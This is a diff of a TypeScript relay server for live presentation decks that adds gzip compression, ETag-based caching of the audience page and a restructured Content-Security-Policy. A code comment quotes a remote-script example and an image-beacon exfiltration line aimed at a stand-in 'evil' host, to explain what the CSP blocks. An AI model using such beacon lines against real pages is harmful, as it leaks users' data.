@@ -28,6 +28,8 @@ import {
 import type { ServerWebSocket } from "bun";
 import { createHash } from "node:crypto";
 import { SessionState, type Owners, type StateStorage } from "./state";
+import { acceptsGzip, audienceHtml, notModified, pageEtag, preparePage, type PreparedPage } from "./page";
+import { gzipSync } from "node:zlib";
 
 /** Templated path for relay span names, collapse session ids so the span name stays bounded
  *  (`/sync/<id>` → `/sync/:id`), the trace-name equivalent of the metric cardinality rule. */
@@ -109,6 +111,8 @@ interface RelaySession {
   hub: Hub;
   /** the built deck HTML (no bootstrap yet, injected per request) */
   html: string;
+  /** The audience's copy of the page, compressed once, built at the first viewer request. */
+  audience?: PreparedPage;
   session: Session;
   /** privileged peer token: the local deck-runner that applies server-plugin effects */
   runnerToken: string;
@@ -310,7 +314,7 @@ export function createRelay(opts: RelayOptions): RelayServer {
     let deckBytes = 0;
     for (const s of sessions.values()) {
       audience += s.audienceCount;
-      deckBytes += Buffer.byteLength(s.html, "utf8");
+      deckBytes += Buffer.byteLength(s.html, "utf8") + (s.audience?.heldBytes ?? 0);
     }
     metrics.sessions.set(liveCount());
     metrics.audiencePeers.set(audience);
@@ -713,10 +717,7 @@ export function createRelay(opts: RelayOptions): RelayServer {
       role === "viewer" ? viewerIdentity(req.headers.get("cookie"), s.id, url.pathname, secure, endsAt, now) : null;
     const wsUrl = `${ws}/sync/${s.id}?t=${token}`;
     const viewer = `${http}/s/${s.id}?t=${s.session.viewerToken}`;
-    // Free-tier provenance badge on the public audience view ((internal ADR)); paid
-    // (white-label) sessions omit it. Presenter view is never watermarked.
-    const html = s.watermark && role === "viewer" ? injectWatermark(s.html) : s.html;
-    const body = injectBootstrap(html, {
+    const boot = {
       ws: wsUrl,
       session: s.id,
       role,
@@ -724,37 +725,68 @@ export function createRelay(opts: RelayOptions): RelayServer {
       participant: identity?.participant ?? "",
       viewer,
       ...(s.audienceInputKeptDays ? { audienceInputKeptDays: s.audienceInputKeptDays } : {}),
-    });
-    return new Response(body, {
-      headers: {
-        "content-type": "text/html; charset=utf-8",
-        // Opaque-origin isolation: no allow-same-origin → the deck can't reach
-        // the relay's cookies/API/DOM, and each load is a fresh opaque origin
-        // (deck-to-deck isolation). connect-src pins the live socket to us.
-        // `allow-popups` enables the presenter pop-out (P → window.open of
-        // /s/:id?t=<presenter grant>#presenter, exchanged like any presenter link), the popup is itself served
-        // sandboxed by the relay and syncs through the Hub, so isolation holds
-        // ((internal ADR)). Without it window.open throws in the sandbox.
-        // `allow-fullscreen` is NOT a valid CSP `sandbox` token (it's an
-        // iframe/Permissions-Policy feature), browsers reject it and log a
-        // console error. Fullscreen for this top-level doc is governed by the
-        // Fullscreen API / Permissions-Policy, not the sandbox directive.
-        //
-        // `default-src 'none'` + a single-file allowlist ((internal ADR)): a deck
-        // inlines all assets ((internal ADR)), so it needs zero external origins, // this blocks remote code (`<script src=evil>`) and GET-beacon exfil
-        // (`new Image().src='https://evil/?x'`) that `connect-src` can't pin.
-        // Mirrors the dashboard's static-share CSP, but keeps `connect-src`
-        // to our sync socket and `allow-popups` for the presenter pop-out.
-        "content-security-policy": `default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data: blob:; font-src data:; media-src data: blob:; connect-src ${ws} ${http}; frame-ancestors 'none'; sandbox allow-scripts allow-popups`,
-        "x-content-type-options": "nosniff",
-        "referrer-policy": "no-referrer",
-        // The same URL answers a presenter (by cookie) and anyone else differently,
-        // and the page holds a grant in its bootstrap: never cache it.
-        "cache-control": NO_STORE,
-        vary: "Cookie",
-        ...(identity ? { "set-cookie": identity.setCookie } : {}),
-      },
-    });
+    };
+    // Opaque-origin isolation: no allow-same-origin → the deck can't reach
+    // the relay's cookies/API/DOM, and each load is a fresh opaque origin
+    // (deck-to-deck isolation). connect-src pins the live socket to us.
+    // `allow-popups` enables the presenter pop-out (P → window.open of
+    // /s/:id?t=<presenter grant>#presenter, exchanged like any presenter link), the popup is itself served
+    // sandboxed by the relay and syncs through the Hub, so isolation holds.
+    // Without it window.open throws in the sandbox.
+    // `allow-fullscreen` is NOT a valid CSP `sandbox` token (it's an
+    // iframe/Permissions-Policy feature), browsers reject it and log a
+    // console error. Fullscreen for this top-level doc is governed by the
+    // Fullscreen API / Permissions-Policy, not the sandbox directive.
+    //
+    // `default-src 'none'` + a single-file allowlist: a deck inlines all
+    // assets, so it needs zero external origins. This blocks remote code
+    // (`<script src=evil>`) and GET-beacon exfil
+    // (`new Image().src='https://evil/?x'`) that `connect-src` can't pin.
+    // Mirrors the dashboard's static-share CSP, but keeps `connect-src`
+    // to our sync socket and `allow-popups` for the presenter pop-out.
+    const csp = `default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data: blob:; font-src data:; media-src data: blob:; connect-src ${ws} ${http}; frame-ancestors 'none'; sandbox allow-scripts allow-popups`;
+    const gzip = acceptsGzip(req.headers.get("accept-encoding"));
+    const base: Record<string, string> = {
+      "content-type": "text/html; charset=utf-8",
+      "content-security-policy": csp,
+      "x-content-type-options": "nosniff",
+      "referrer-policy": "no-referrer",
+      ...(identity ? { "set-cookie": identity.setCookie } : {}),
+    };
+
+    if (role === "presenter") {
+      // The deck exactly as uploaded. The same URL answers a presenter (by cookie) and
+      // anyone else differently, and the page holds the presenter grant: never cached.
+      const body = injectBootstrap(s.html, boot);
+      const headers = { ...base, "cache-control": NO_STORE, vary: "Cookie, Accept-Encoding" };
+      metrics.pageResponses.inc({ role, encoding: gzip ? "gzip" : "identity" });
+      if (!gzip) return new Response(body, { headers });
+      return new Response(gzipSync(body, { level: 6 }), { headers: { ...headers, "content-encoding": "gzip" } });
+    }
+
+    // A viewer: the audience copy, compressed once per session. The browser keeps it and
+    // asks again on every load (a reload, the QR scanned again, the phone back from
+    // another app); while it still holds this viewer's page, the answer is a 304. The
+    // validator covers everything the page holds for this viewer, participant id
+    // included, so a browser whose cookie changed gets a fresh page. Every check above
+    // (session, grant, expiry) runs first: an ended talk is a 403, never a stored copy.
+    // No `Vary: Cookie`: the first load comes without the cookie it sets, so the browser
+    // would treat the first reload as a different response and not ask with its validator.
+    // Free sessions carry the provenance badge in the audience copy; paid (white-label)
+    // sessions and the presenter never do.
+    s.audience ??= preparePage(audienceHtml(s.watermark ? injectWatermark(s.html) : s.html));
+    const page = s.audience;
+    const etag = pageEtag(page, boot, csp);
+    const headers = { ...base, "cache-control": "private, no-cache", etag, vary: "Accept-Encoding" };
+    if (notModified(req.headers.get("if-none-match"), etag)) {
+      metrics.pageResponses.inc({ role, encoding: "not_modified" });
+      const unchanged: Record<string, string> = { ...headers };
+      delete unchanged["content-type"];
+      return new Response(null, { status: 304, headers: unchanged });
+    }
+    metrics.pageResponses.inc({ role, encoding: gzip ? "gzip" : "identity" });
+    if (!gzip) return new Response(page.text(boot), { headers });
+    return new Response(page.gzip(boot), { headers: { ...headers, "content-encoding": "gzip" } });
   };
 
   // HTTP dispatcher, a closure (keeps access to sessions/cfg/cordoned), wrapped in a SERVER span
